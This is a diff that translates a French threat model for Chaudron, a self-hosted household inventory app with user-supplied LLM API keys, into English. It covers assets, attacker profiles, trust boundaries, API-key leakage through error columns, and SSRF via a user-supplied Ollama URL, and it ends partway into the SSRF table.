@@ -1,189 +1,184 @@
-# Chaudron — modèle de menace
+# Chaudron — threat model
 
-> Document de cadrage. Rédigé en français ; **tous les identifiants cités
-> (tables, colonnes, variables d'environnement, endpoints) sont en anglais** et
-> font foi tels quels.
-> Statut : proposition, à relire à chaque ADR touchant une des surfaces ci-dessous.
-> Compagnon : [`security-review-baseline.md`](security-review-baseline.md), qui
-> audite le baseline existant plutôt que la conception.
-
----
-
-## 1. Objet et portée
-
-Ce document décrit **ce qu'on protège, contre qui, avec quoi, et ce qui reste
-découvert**. Il n'est pas une checklist de bonnes pratiques : il n'énumère que
-les menaces qui ont un coût concret pour une personne qui utilise Chaudron ou qui
-en exploite une instance.
-
-Il est écrit pendant la phase de cadrage, avant tout code de fonctionnalité.
-C'est le seul moment où corriger une frontière de confiance coûte une
-après-midi plutôt qu'une migration.
-
-**Périmètre.** L'application Chaudron telle que conçue : backend FastAPI, PWA
-React, PostgreSQL 16, conteneurs Podman rootless, CI GitHub Actions, et les
-quatre dépendances externes (fournisseurs de modèles, Open Food Facts, service
-de réception d'emails, instances Ollama).
-
-**Hors périmètre.** La sécurité de l'hôte, la configuration TLS du reverse
-proxy, la sécurité interne d'Open Food Facts ou d'un fournisseur de modèle, et
-les attaques supposant un opérateur d'instance déjà compromis avec les droits
-root. Ces exclusions sont assumées et cohérentes avec [`SECURITY.md`](../SECURITY.md).
-
-**Hypothèses de base.**
-
-1. L'instance est exploitée par une personne qui n'est pas une équipe sécurité.
-   Tout contrôle qui exige une vigilance quotidienne échouera.
-2. Le code est public (AGPL-3.0). Voir §7.
-3. La phase 2 (comptes créés par des tiers) arrivera. Une conception qui n'est
-   sûre qu'en phase 1 est une conception à réécrire.
+> Scoping document. **All identifiers cited (tables, columns, environment
+> variables, endpoints) are in English** and are authoritative as written.
+> Status: proposal, to be re-read at every ADR touching one of the surfaces below.
+> Companion: [`security-review-baseline.md`](security-review-baseline.md), which
+> audits the existing baseline rather than the design.
 
 ---
 
-## 2. Actifs, classés par gravité de compromission
+## 1. Purpose and scope
 
-L'ordre est celui du coût réel pour la personne lésée, pas celui de la facilité
-d'exploitation.
+This document describes **what we protect, against whom, with what, and what is
+left uncovered**. It is not a best-practices checklist: it enumerates only the
+threats that carry a concrete cost for someone who uses Chaudron or who operates
+an instance of it.
 
-| # | Actif | Où il vit | Ce que coûte sa compromission |
+It is written during the scoping phase, before any feature code. This is the
+only moment when fixing a trust boundary costs an afternoon rather than a
+migration.
+
+**In scope.** The Chaudron application as designed: FastAPI backend, React PWA,
+PostgreSQL 16, rootless Podman containers, GitHub Actions CI, and the four
+external dependencies (model providers, Open Food Facts, inbound email service,
+Ollama instances).
+
+**Out of scope.** Host security, the reverse proxy's TLS configuration, the
+internal security of Open Food Facts or of a model provider, and attacks that
+assume an already-compromised instance operator with root privileges. These
+exclusions are deliberate and consistent with [`SECURITY.md`](../SECURITY.md).
+
+**Baseline assumptions.**
+
+1. The instance is operated by a person who is not a security team. Any control
+   that demands daily vigilance will fail.
+2. The code is public (AGPL-3.0). See §7.
+3. Phase 2 (accounts created by third parties) will come. A design that is safe
+   only in phase 1 is a design to be rewritten.
+
+---
+
+## 2. Assets, ranked by severity of compromise
+
+The order reflects the real cost to the injured party, not ease of exploitation.
+
+| # | Asset | Where it lives | What its compromise costs |
 |---|---|---|---|
-| **A1** | **Clés d'API des fournisseurs déposées par les foyers** | `llm_provider_config.api_key_ciphertext`, et **en clair en mémoire** à chaque appel | Secret **monétaire appartenant à un tiers**. Vol = facture chez Anthropic/OpenAI/Google/Mistral, sur un compte que Chaudron ne contrôle pas et ne peut pas plafonner. Dommage financier direct, non plafonné, et perte de confiance irrécupérable : c'est le seul actif dont le propriétaire n'est ni l'utilisateur ni l'exploitant. |
-| **A2** | **`CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`** | Environnement du conteneur | Déchiffre **tous** les A1 de l'instance d'un coup. C'est le point de défaillance unique de la protection au repos. |
-| **A3** | **Inventaire complet d'un domicile** | `inventory_lot`, et surtout `recipe_suggestion.stock_snapshot` (JSONB, inventaire figé) | Cartographie de la consommation d'un foyer : régime, allergies, produits médicaux, alcool, produits confessionnels, présence d'enfants, budget, rythme de vie et **absences** (un stock qui cesse de bouger dit qu'il n'y a personne). Données potentiellement **sensibles au sens de l'article 9 RGPD** (santé, convictions religieuses) — voir §8. |
-| **A4** | **Images de tickets de caisse** | Stockage objet, clé `receipt.image_object_key` | Où, quand, quoi, combien. Numéro de carte de fidélité, parfois 4 derniers chiffres d'une carte bancaire, parfois un nom. Une image est plus difficile à expurger qu'une ligne : ce qui est sur la photo y reste. |
-| **A5** | **`CHAUDRON_SECRET_KEY`** | Environnement | Forge de sessions/JWT ⇒ usurpation de n'importe quel compte ⇒ accès à A1, A3, A4. |
-| **A6** | **Identités et secrets d'authentification** | `user_account.email`, `password_hash` | Réutilisation de mot de passe hors Chaudron ; l'email seul suffit à du phishing ciblé (« votre clé Anthropic ne fonctionne plus »). |
-| **A7** | **`CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY`** | Environnement | Injection d'achats arbitraires dans **n'importe quel** foyer, et point d'entrée de contenu non fiable vers un modèle (§6.6). |
-| **A8** | **Mot de passe PostgreSQL / accès base** | Secret Podman, réseau `chaudron-net` | Lecture de A1 chiffrés (inexploitables seuls), A3, A4 en clair. La cascade dépend entièrement de A2 restant hors de portée. |
-| **A9** | **Intégrité du stock d'un foyer** | Tables métier | Pas une fuite mais une nuisance réelle : un stock faux fait abandonner l'application. Et une **information allergène fausse a des conséquences physiques**. |
-| **A10** | **Cartographie de l'infrastructure privée d'un foyer** | `llm_provider_config.base_url` (URL d'un Ollama domestique), `CHAUDRON_OLLAMA_ALLOWED_HOSTS` | Ne compromet rien seul, mais renseigne un attaquant sur le réseau interne d'un tiers. |
-| **A11** | **Disponibilité et budget de l'exploitant** | Mode `instance_owner`, quota Open Food Facts | Un abus fait payer l'exploitant (A11a) ou fait bannir l'IP de l'instance par Open Food Facts, coupant le service pour tous (A11b). |
+| **A1** | **Provider API keys supplied by households** | `llm_provider_config.api_key_ciphertext`, and **in cleartext in memory** on every call | A **monetary secret belonging to a third party**. Theft = a bill at Anthropic/OpenAI/Google/Mistral, on an account that Chaudron neither controls nor can cap. Direct, uncapped financial damage, and an unrecoverable loss of trust: it is the only asset whose owner is neither the user nor the operator. |
+| **A2** | **`CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`** | Container environment | Decrypts **every** A1 on the instance at once. It is the single point of failure of at-rest protection. |
+| **A3** | **A household's complete inventory** | `inventory_lot`, and above all `recipe_suggestion.stock_snapshot` (JSONB, frozen inventory) | A map of a household's consumption: diet, allergies, medical products, alcohol, faith-related products, presence of children, budget, daily rhythm, and **absences** (stock that stops moving says nobody is home). Data potentially **sensitive within the meaning of GDPR Article 9** (health, religious beliefs) — see §8. |
+| **A4** | **Receipt images** | Object storage, key `receipt.image_object_key` | Where, when, what, how much. Loyalty card number, sometimes the last 4 digits of a bank card, sometimes a name. An image is harder to redact than a row: what is in the photo stays there. |
+| **A5** | **`CHAUDRON_SECRET_KEY`** | Environment | Forging sessions/JWTs ⇒ impersonation of any account ⇒ access to A1, A3, A4. |
+| **A6** | **Identities and authentication secrets** | `user_account.email`, `password_hash` | Password reuse outside Chaudron; the email alone is enough for targeted phishing ("your Anthropic key has stopped working"). |
+| **A7** | **`CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY`** | Environment | Injection of arbitrary purchases into **any** household, and an entry point for untrusted content heading to a model (§6.6). |
+| **A8** | **PostgreSQL password / database access** | Podman secret, `chaudron-net` network | Reads encrypted A1 (unusable on their own), A3 and A4 in cleartext. The cascade depends entirely on A2 remaining out of reach. |
+| **A9** | **Integrity of a household's stock** | Business tables | Not a leak but a real nuisance: wrong stock makes people abandon the application. And **wrong allergen information has physical consequences**. |
+| **A10** | **Map of a household's private infrastructure** | `llm_provider_config.base_url` (URL of a home Ollama), `CHAUDRON_OLLAMA_ALLOWED_HOSTS` | Compromises nothing on its own, but informs an attacker about a third party's internal network. |
+| **A11** | **The operator's availability and budget** | `instance_owner` mode, Open Food Facts quota | Abuse makes the operator pay (A11a) or gets the instance's IP banned by Open Food Facts, cutting off the service for everyone (A11b). |
 
-**Le classement dit une chose importante :** les trois premiers actifs
-n'appartiennent pas à l'exploitant. C'est ce qui distingue Chaudron d'un outil
-personnel — on garde le bien d'autrui.
-
----
-
-## 3. Profils d'attaquant
-
-Cinq profils réalistes. Chacun est décrit par ce qu'il **a déjà**, ce qu'il
-**veut**, et ce qui le rend crédible ici.
-
-### P1 — Utilisateur légitime d'un autre foyer
-
-**A déjà :** un compte valide, une session valide, un `household_id` à lui, et
-la connaissance intime du produit (il l'utilise).
-**Veut :** voir l'inventaire, les tickets ou les recettes d'un autre foyer ; ou
-faire payer la clé d'API d'un autre foyer.
-**Crédible parce que :** c'est le seul attaquant qui n'a **rien à contourner
-pour atteindre l'API**. Il lui suffit de substituer un identifiant. C'est le
-profil le plus probable et celui contre lequel la conception est la plus
-faible ([§6.3](#63-s3--isolation-entre-foyers)).
-**Capacité :** substitution d'UUID, manipulation de paramètres, appels
-concurrents, exploration de l'API à partir du code source public.
-
-### P2 — Visiteur non authentifié
-
-**A déjà :** l'URL de l'instance et le code source.
-**Veut :** un accès quelconque — création de compte non sollicitée, lecture
-d'une image de ticket par son URL, injection via le webhook email, énumération
-de comptes par le formulaire de connexion ou de réinitialisation.
-**Crédible parce que :** une instance auto-hébergée est exposée sur Internet
-sans WAF ni fail2ban, et le webhook email est par construction un endpoint
-public. C'est aussi le profil des scanners automatisés, qui trouveront
-l'instance quelle que soit son obscurité.
-
-### P3 — Opérateur d'instance malveillant ou négligent
-
-**A déjà :** root sur l'hôte, la base, `CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`.
-**Veut :** les clés d'API des foyers hébergés, ou leurs données.
-**Crédible parce que :** l'auto-hébergement encourage des instances partagées
-entre amis, colocations ou familles élargies. **Contre lui, il n'existe aucun
-contrôle technique** : l'application doit déchiffrer A1 pour appeler le
-fournisseur, donc l'opérateur peut lire A1. C'est une propriété du modèle BYOK,
-pas un défaut réparable.
-**Conséquence de conception :** ce fait doit être **écrit dans l'interface**, au
-moment où l'utilisateur colle sa clé — « l'administrateur de cette instance peut
-techniquement lire cette clé ; déposez une clé dédiée et plafonnée ». Un
-utilisateur informé qui accepte n'est pas une victime ; un utilisateur qui
-l'ignore l'est.
-
-### P4 — Attaquant réseau
-
-**A déjà :** une position sur le chemin réseau, ou le contrôle d'un hôte que le
-serveur Chaudron accepte de contacter (une instance Ollama, un DNS, un service de
-réception d'emails).
-**Veut :** pivoter vers le réseau interne de l'instance via SSRF, ou intercepter
-des données en transit.
-**Crédible parce que :** l'URL Ollama est **fournie par l'utilisateur et
-appelée par le serveur** — c'est une primitive SSRF par construction, et le
-filtrage habituel est inopérant puisque l'adresse légitime d'un Ollama
-colocalisé *est* privée ([§6.2](#62-s2--ssrf-via-lurl-ollama)).
-
-### P5 — Contributeur hostile via pull request
-
-**A déjà :** un compte GitHub, le droit d'ouvrir une PR depuis un fork (le dépôt
-est public).
-**Veut :** exécuter du code sur le runner CI, exfiltrer un secret de dépôt,
-empoisonner un cache, ou glisser une régression discrète (un `WHERE household_id`
-retiré, une comparaison de signature non constante, une allowlist élargie « pour
-le confort »).
-**Crédible parce que :** le projet est maintenu par une personne seule, qui
-relit à ses heures perdues, et la CI construit une image à partir d'un
-`Containerfile` que la PR contrôle. Le vecteur « régression discrète » est plus
-réaliste que le vecteur « exfiltration » : `CONTRIBUTING.md` §6 liste déjà les
-motifs de refus correspondants, ce qui montre que le risque est identifié.
-
-**Profil volontairement absent :** l'attaquant étatique. Hors de portée d'un
-projet solo, et le mentionner dilue les cinq précédents.
+**The ranking says something important:** the first three assets do not belong to
+the operator. That is what distinguishes Chaudron from a personal tool — we hold
+somebody else's property.
 
 ---
 
-## 4. Frontières de confiance
+## 3. Attacker profiles
 
-Une frontière est un endroit où la donnée change de propriétaire ou de niveau de
-confiance. Toute donnée qui traverse une frontière entrante est **hostile par
-défaut**, y compris quand elle vient d'un modèle qu'on paie.
+Five realistic profiles. Each is described by what it **already has**, what it
+**wants**, and what makes it credible here.
+
+### P1 — Legitimate user of another household
+
+**Already has:** a valid account, a valid session, a `household_id` of its own,
+and intimate knowledge of the product (they use it).
+**Wants:** to see another household's inventory, receipts or recipes; or to make
+another household's API key pay.
+**Credible because:** it is the only attacker with **nothing to bypass in order
+to reach the API**. Substituting one identifier is enough. It is the most likely
+profile and the one against which the design is weakest
+([§6.3](#63-s3--tenant-isolation-between-households)).
+**Capability:** UUID substitution, parameter tampering, concurrent calls,
+exploration of the API from the public source code.
+
+### P2 — Unauthenticated visitor
+
+**Already has:** the instance URL and the source code.
+**Wants:** any access at all — unsolicited account creation, reading a receipt
+image by its URL, injection through the email webhook, account enumeration via
+the login or reset form.
+**Credible because:** a self-hosted instance is exposed on the Internet with no
+WAF and no fail2ban, and the email webhook is by construction a public endpoint.
+This is also the profile of automated scanners, which will find the instance
+however obscure it is.
+
+### P3 — Malicious or negligent instance operator
+
+**Already has:** root on the host, the database, `CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`.
+**Wants:** the API keys of the hosted households, or their data.
+**Credible because:** self-hosting encourages instances shared between friends,
+flatmates or extended families. **Against this attacker there exists no technical
+control**: the application must decrypt A1 in order to call the provider, so the
+operator can read A1. This is a property of the BYOK model, not a fixable defect.
+**Design consequence:** this fact must be **written into the interface**, at the
+moment the user pastes their key — "the administrator of this instance can
+technically read this key; supply a dedicated key with a spending cap". An
+informed user who accepts is not a victim; a user who is unaware is one.
+
+### P4 — Network attacker
+
+**Already has:** a position on the network path, or control of a host that the
+Chaudron server agrees to contact (an Ollama instance, a DNS, an inbound email
+service).
+**Wants:** to pivot into the instance's internal network via SSRF, or to
+intercept data in transit.
+**Credible because:** the Ollama URL is **supplied by the user and called by the
+server** — it is an SSRF primitive by construction, and the usual filtering is
+inoperative since the legitimate address of a co-located Ollama *is* private
+([§6.2](#62-s2--ssrf-via-the-ollama-url)).
+
+### P5 — Hostile contributor via pull request
+
+**Already has:** a GitHub account, the right to open a PR from a fork (the
+repository is public).
+**Wants:** to run code on the CI runner, exfiltrate a repository secret, poison a
+cache, or slip in a quiet regression (a `WHERE household_id` removed, a
+non-constant-time signature comparison, an allowlist widened "for convenience").
+**Credible because:** the project is maintained by a single person, who reviews
+in their spare time, and CI builds an image from a `Containerfile` that the PR
+controls. The "quiet regression" vector is more realistic than the
+"exfiltration" vector: `CONTRIBUTING.md` §6 already lists the corresponding
+grounds for rejection, which shows the risk is identified.
+
+**Profile deliberately absent:** the state actor. Out of reach for a solo
+project, and mentioning it dilutes the five above.
+
+---
+
+## 4. Trust boundaries
+
+A boundary is a place where data changes owner or trust level. Any data crossing
+an inbound boundary is **hostile by default**, including when it comes from a
+model we pay for.
 
 ```mermaid
 flowchart TB
-    subgraph untrusted["Zone non fiable — tout ce qui entre est hostile"]
-        BROWSER["Navigateur / PWA<br/><i>P1, P2</i>"]
-        MAILSVC["Service d'emails entrants<br/><i>webhook public — P2</i>"]
-        OFF["Open Food Facts<br/><i>contenu contributif</i>"]
-        LLM["Fournisseurs de modèles<br/>Anthropic · OpenAI · Gemini · Mistral"]
-        OLLAMA["Instance Ollama du foyer<br/><i>URL fournie par l'utilisateur — P4</i>"]
-        FORK["Pull request depuis un fork<br/><i>P5</i>"]
+    subgraph untrusted["Untrusted zone — everything entering is hostile"]
+        BROWSER["Browser / PWA<br/><i>P1, P2</i>"]
+        MAILSVC["Inbound email service<br/><i>public webhook — P2</i>"]
+        OFF["Open Food Facts<br/><i>contributed content</i>"]
+        LLM["Model providers<br/>Anthropic · OpenAI · Gemini · Mistral"]
+        OLLAMA["Household Ollama instance<br/><i>user-supplied URL — P4</i>"]
+        FORK["Pull request from a fork<br/><i>P5</i>"]
     end
 
-    subgraph edge["Frontière applicative — la seule qui décide"]
-        AUTH["Authentification<br/>session → user_id"]
-        TENANT["Résolution du foyer<br/>household_id ← session UNIQUEMENT"]
-        VALID["Validation Pydantic stricte<br/>entrée ET sortie de modèle"]
-        SSRF["Validation d'URL sortante<br/>allowlist + résolution épinglée"]
-        SIG["Vérification de signature<br/>webhook, temps constant"]
+    subgraph edge["Application boundary — the only one that decides"]
+        AUTH["Authentication<br/>session → user_id"]
+        TENANT["Household resolution<br/>household_id ← session ONLY"]
+        VALID["Strict Pydantic validation<br/>model input AND output"]
+        SSRF["Outbound URL validation<br/>allowlist + pinned resolution"]
+        SIG["Signature verification<br/>webhook, constant time"]
     end
 
-    subgraph trusted["Zone de confiance applicative"]
-        SVC["services / domain<br/><i>reçoit un household_id, jamais ne le devine</i>"]
-        REPO["Repositories<br/><i>filtre de tenant systématique</i>"]
+    subgraph trusted["Application trust zone"]
+        SVC["services / domain<br/><i>receives a household_id, never guesses it</i>"]
+        REPO["Repositories<br/><i>systematic tenant filter</i>"]
     end
 
-    subgraph data["Zone de données — au repos"]
-        DB[("PostgreSQL 16<br/>A3, A4-métadonnées, A1 chiffré")]
-        OBJ[("Stockage objet<br/>images de tickets — A4")]
+    subgraph data["Data zone — at rest"]
+        DB[("PostgreSQL 16<br/>A3, A4 metadata, encrypted A1")]
+        OBJ[("Object storage<br/>receipt images — A4")]
     end
 
-    subgraph secrets["Zone de secrets — jamais en base, jamais en logs"]
+    subgraph secrets["Secrets zone — never in the database, never in logs"]
         KEK["CHAUDRON_CREDENTIAL_ENCRYPTION_KEY — A2"]
         SK["CHAUDRON_SECRET_KEY — A5"]
         WHK["CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY — A7"]
     end
 
-    subgraph ci["Chaîne d'intégration"]
-        GHA["GitHub Actions<br/><i>token en lecture, aucun secret sur PR de fork</i>"]
-        IMG["Image OCI<br/>UID 10001, ReadOnly, DropCapability=ALL"]
+    subgraph ci["Integration chain"]
+        GHA["GitHub Actions<br/><i>read-only token, no secret on fork PRs</i>"]
+        IMG["OCI image<br/>UID 10001, ReadOnly, DropCapability=ALL"]
     end
 
     BROWSER -->|HTTPS| AUTH --> TENANT --> VALID --> SVC
@@ -191,13 +186,13 @@ flowchart TB
     SVC --> REPO --> DB
     SVC --> OBJ
     SVC --> SSRF
-    SSRF -->|sortant| OLLAMA
-    SVC -->|sortant| LLM
-    SVC -->|sortant| OFF
-    LLM -.->|"réponse = entrée non fiable"| VALID
-    OFF -.->|"contenu contributif = entrée non fiable"| VALID
-    OLLAMA -.->|"réponse = entrée non fiable"| VALID
-    KEK -.->|déchiffre à l'appel| SVC
+    SSRF -->|outbound| OLLAMA
+    SVC -->|outbound| LLM
+    SVC -->|outbound| OFF
+    LLM -.->|"response = untrusted input"| VALID
+    OFF -.->|"contributed content = untrusted input"| VALID
+    OLLAMA -.->|"response = untrusted input"| VALID
+    KEK -.->|decrypts at call time| SVC
     SK -.-> AUTH
     WHK -.-> SIG
     FORK --> GHA --> IMG
@@ -212,526 +207,572 @@ flowchart TB
     class KEK,SK,WHK secret
 ```
 
-**Trois règles se lisent directement sur ce diagramme, et aucune n'est
-négociable :**
+**Three rules read directly off this diagram, and none of them is
+negotiable:**
 
-1. **`household_id` n'entre jamais par une flèche venant de la zone non fiable.**
-   Ni en-tête, ni sous-domaine, ni corps, ni paramètre de chemin. Il naît de la
-   session, une seule fois, à la frontière. C'est déjà un motif de refus de PR
-   (`CONTRIBUTING.md` §6) ; c'est ici la raison.
-2. **Les réponses des services externes rentrent par la même porte que les
-   entrées utilisateur.** Un JSON produit par un modèle, une fiche Open Food
-   Facts, une réponse Ollama : même validation Pydantic, mêmes bornes de taille,
-   même traitement à l'affichage. Payer un fournisseur ne rend pas sa sortie
-   fiable.
-3. **Les secrets ne traversent jamais la frontière dans le sens sortant.** Ni
-   vers le navigateur, ni vers les logs, ni vers une trace d'exception, ni vers
-   une colonne de base (§6.1). La zone secrets n'a que des flèches entrantes vers
-   le traitement, jamais vers la persistance.
+1. **`household_id` never enters through an arrow coming from the untrusted
+   zone.** Not a header, not a subdomain, not a body, not a path parameter. It is
+   born from the session, once, at the boundary. It is already a ground for
+   rejecting a PR (`CONTRIBUTING.md` §6); here is the reason.
+2. **Responses from external services come in through the same door as user
+   input.** JSON produced by a model, an Open Food Facts entry, an Ollama
+   response: same Pydantic validation, same size bounds, same handling at
+   display time. Paying a provider does not make its output trustworthy.
+3. **Secrets never cross the boundary in the outbound direction.** Not to the
+   browser, not to the logs, not to an exception trace, not to a database column
+   (§6.1). The secrets zone has only inbound arrows toward processing, never
+   toward persistence.
 
 ---
 
-## 5. Comment lire les tableaux de la section 6
+## 5. How to read the tables in section 6
 
-Chaque surface est décrite par quatre colonnes. **La colonne « Non couvert » est
-la plus importante du document.** Une menace listée comme couverte et qui ne
-l'est pas est pire qu'une menace non listée : elle produit une fausse sécurité,
-et personne ne la relit.
+Each surface is described by four columns. **The "Not covered" column is the most
+important one in the document.** A threat listed as covered that is not is worse
+than an unlisted threat: it produces false security, and nobody re-reads it.
 
-Un contrôle est dit **« retenu »** quand il est décidé, pas quand il est
-implémenté. À ce stade du projet, **aucun contrôle n'est implémenté** : ce
-document décrit la cible, pas l'état.
+A control is called **"adopted"** when it has been decided, not when it has been
+implemented. At this stage of the project, **no control is implemented**: this
+document describes the target, not the state.
 
 ---
 
 ## 6. Surfaces
 
-### 6.1 S1 — Clés d'API des fournisseurs déposées par les foyers
+### 6.1 S1 — Provider API keys supplied by households
 
-**Actifs :** A1, A2. **Attaquants :** P1, P2, P3.
+**Assets:** A1, A2. **Attackers:** P1, P2, P3.
 
-Le fait structurant, énoncé sans détour dans l'ADR-0007 : *« le chiffrement au
-repos ne protège pas d'une compromission applicative, puisque l'application doit
-déchiffrer pour appeler »*. Le chiffrement au repos protège **un dump de base
-volé**, et rien d'autre. Tout le reste du dispositif consiste à faire en sorte
-que la clé, une fois déchiffrée en mémoire, n'aille nulle part.
+The structuring fact, stated bluntly in ADR-0007: *"encryption at rest does not
+protect against an application compromise, since the application must decrypt in
+order to call"*. Encryption at rest protects **a stolen database dump**, and
+nothing else. Everything else in the setup consists of making sure that the key,
+once decrypted in memory, goes nowhere.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Vol d'un dump PostgreSQL (sauvegarde, réplique, poubelle d'un hébergeur) | Aucun si A2 est ailleurs — le chiffré seul est inexploitable | AES-256-GCM ; clé issue de l'environnement, **jamais de la base, jamais d'une migration, jamais d'un seed** ; AAD = `(household_id, config_id)` donc un chiffré recopié sur une autre ligne ne se déchiffre pas | **Si A2 est stockée à côté du dump** — dans le même répertoire personnel, dans la même sauvegarde de `$HOME` — le contrôle est nul. Le fichier d'environnement et le dump voyagent ensemble par défaut. C'est le mode d'échec le plus probable, et il est opérationnel, pas cryptographique. |
-| Lecture de la clé par un endpoint de l'API | Vol de A1 par P1 ou P2 | Aucun schéma de réponse ne contient le chiffré ni sa version déchiffrée ; seuls `provider`, `api_key_set_at` et `api_key_last4` sortent. Colonne `deferred=True` en SQLAlchemy : un `select()` ordinaire **ne charge pas** le chiffré, il faut un `undefer()` explicite, greppable et visible en revue | Un `undefer()` légitime dans le service d'appel reste un `undefer()`. Rien n'empêche un schéma Pydantic de sérialiser l'objet ORM complet si quelqu'un renvoie l'entité au lieu d'un DTO. **Le contrôle est une friction, pas une barrière.** |
-| **Fuite par le canal d'erreur** | Vol de A1, en clair, persisté | Filtre de journalisation structurée ; `__repr__` masqué sur les objets de configuration ; réécriture des traces renvoyées au client | **Le schéma contredit le contrôle.** `llm_provider_config.last_error` et `receipt.parse_error` sont des colonnes `text` destinées à recevoir le message d'erreur amont, et `last_error` est affiché dans le bandeau « votre clé ne fonctionne plus ». Un fournisseur, un proxy ou un Ollama hostile qui renvoie l'en-tête `Authorization` dans son message d'erreur écrit A1 en clair en base, puis à l'écran, puis dans la sauvegarde. **Aucune redaction n'est spécifiée à l'écriture de ces colonnes.** |
-| Fuite par `raw_response` | Vol de A1 si le fournisseur écho la requête | — | Non traité. `receipt.raw_response` (JSONB) reçoit la sortie brute du modèle sans borne ni filtre décrits. |
-| Rotation de A2 | Impossibilité de déchiffrer, ou fenêtre d'exposition prolongée | `api_key_encryption_key_id` permet de lire l'ancien et d'écrire le nouveau, donc une migration en tâche de fond sans arrêt | **La procédure n'existe pas** : ni déclencheur, ni fréquence, ni tâche de re-chiffrement, ni comportement si l'ancienne clé a disparu de l'environnement (data-model §11 q15). Une mécanique sans procédure ne sera jamais exécutée. |
-| Rotation d'une clé A1 par l'utilisateur | Ancienne clé toujours valide chez le fournisseur | Écriture idempotente, l'ancienne valeur est écrasée | Chaudron ne peut pas révoquer une clé chez Anthropic. L'interface **doit** dire « révoquez aussi l'ancienne clé dans votre console », sinon la rotation est cosmétique. |
-| Opérateur d'instance (P3) | Vol de toutes les A1 de l'instance | **Aucun, et c'est irréductible** | Non couvert par construction. Traité par la transparence : l'avertissement au moment de la saisie (§3, P3), et la recommandation d'une clé dédiée avec plafond de dépense côté fournisseur. |
-| Vol de A1 par accès en écriture à la base | Se réattribuer la clé d'un autre foyer | AAD lié à la ligne : le chiffré recopié ne se déchiffre pas. FK composite sur `llm_purpose_binding` : affecter la configuration d'un autre foyer est **impossible au niveau base** | Le mode `instance_owner` est verrouillé par une règle **inter-tables**, donc non exprimable en `CHECK` ; elle repose sur le service seul. |
+| Theft of a PostgreSQL dump (backup, replica, a hosting provider's bin) | None if A2 is elsewhere — the ciphertext alone is unusable | AES-256-GCM; key taken from the environment, **never from the database, never from a migration, never from a seed**; AAD = `(household_id, config_id)`, so a ciphertext copied onto another row does not decrypt | **If A2 is stored next to the dump** — in the same home directory, in the same backup of `$HOME` — the control is worth nothing. The environment file and the dump travel together by default. This is the most likely failure mode, and it is operational, not cryptographic. |
+| Reading the key through an API endpoint | Theft of A1 by P1 or P2 | No response schema contains the ciphertext or its decrypted form; only `provider`, `api_key_set_at` and `api_key_last4` go out. `deferred=True` column in SQLAlchemy: an ordinary `select()` **does not load** the ciphertext, an explicit `undefer()` is required — greppable and visible in review | A legitimate `undefer()` in the calling service is still an `undefer()`. Nothing prevents a Pydantic schema from serialising the whole ORM object if someone returns the entity instead of a DTO. **The control is friction, not a barrier.** |
+| **Leak through the error channel** | Theft of A1, in cleartext, persisted | Structured logging filter; masked `__repr__` on configuration objects; rewriting of traces returned to the client | **The schema contradicts the control.** `llm_provider_config.last_error` and `receipt.parse_error` are `text` columns intended to receive the upstream error message, and `last_error` is displayed in the "your key has stopped working" banner. A provider, a proxy or a hostile Ollama that returns the `Authorization` header in its error message writes A1 in cleartext into the database, then onto the screen, then into the backup. **No redaction is specified when writing these columns.** |
+| Leak through `raw_response` | Theft of A1 if the provider echoes the request | — | Not handled. `receipt.raw_response` (JSONB) receives the model's raw output with no described bound and no filter. |
+| Rotation of A2 | Inability to decrypt, or a prolonged exposure window | `api_key_encryption_key_id` allows reading the old and writing the new, hence a background migration with no downtime | **The procedure does not exist**: no trigger, no frequency, no re-encryption task, no behaviour if the old key has disappeared from the environment (data-model §11 q15). A mechanism without a procedure will never be run. |
+| Rotation of an A1 key by the user | The old key still valid at the provider | Idempotent write, the old value is overwritten | Chaudron cannot revoke a key at Anthropic. The interface **must** say "also revoke the old key in your console", otherwise the rotation is cosmetic. |
+| Instance operator (P3) | Theft of every A1 on the instance | **None, and this is irreducible** | Not covered by construction. Handled through transparency: the warning at entry time (§3, P3), and the recommendation of a dedicated key with a spending cap on the provider side. |
+| Theft of A1 through write access to the database | Reassigning another household's key to oneself | AAD bound to the row: a copied ciphertext does not decrypt. Composite FK on `llm_purpose_binding`: assigning another household's configuration is **impossible at the database level** | `instance_owner` mode is locked by a **cross-table** rule, hence not expressible as a `CHECK`; it rests on the service alone. |
 
-**Conséquence pour la v1 :** la fuite par le canal d'erreur est la faille la plus
-crédible de cette surface, parce qu'elle ne suppose aucun attaquant — juste un
-fournisseur bavard et un développeur qui écrit `last_error = str(exc)`.
+**Consequence for v1:** the leak through the error channel is the most credible
+flaw on this surface, because it assumes no attacker at all — just a talkative
+provider and a developer who writes `last_error = str(exc)`.
 
 ---
 
-### 6.2 S2 — SSRF via l'URL Ollama
+### 6.2 S2 — SSRF via the Ollama URL
 
-**Actifs :** A10, réseau interne de l'hôte. **Attaquant :** P1, P4.
+**Assets:** A10, the host's internal network. **Attacker:** P1, P4.
 
-Rappel du problème, correctement posé dans l'ADR-0007 : l'URL est fournie par
-l'utilisateur et appelée par le serveur, et **le filtrage habituel — rejeter les
-plages privées — est inopérant**, puisque l'adresse légitime d'un Ollama
-colocalisé est privée. D'où l'allowlist explicite `CHAUDRON_OLLAMA_ALLOWED_HOSTS`.
+Recap of the problem, correctly stated in ADR-0007: the URL is supplied by the
+user and called by the server, and **the usual filtering — rejecting private
+ranges — is inoperative**, since the legitimate address of a co-located Ollama is
+private. Hence the explicit allowlist `CHAUDRON_OLLAMA_ALLOWED_HOSTS`.
 
-C'est le bon contrôle. Mais une allowlist n'est sûre que si **l'hôte qu'on
-autorise est exactement l'hôte qu'on contacte**, et c'est là que tout se joue.
+This is the right control. But an allowlist is only safe if **the host we allow
+is exactly the host we contact**, and that is where everything is decided.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| URL vers un hôte arbitraire | Le serveur devient un proxy | Allowlist explicite par variable d'environnement ; schéma limité à `http`/`https` ; hors allowlist ⇒ refus à l'enregistrement avec message explicite | — |
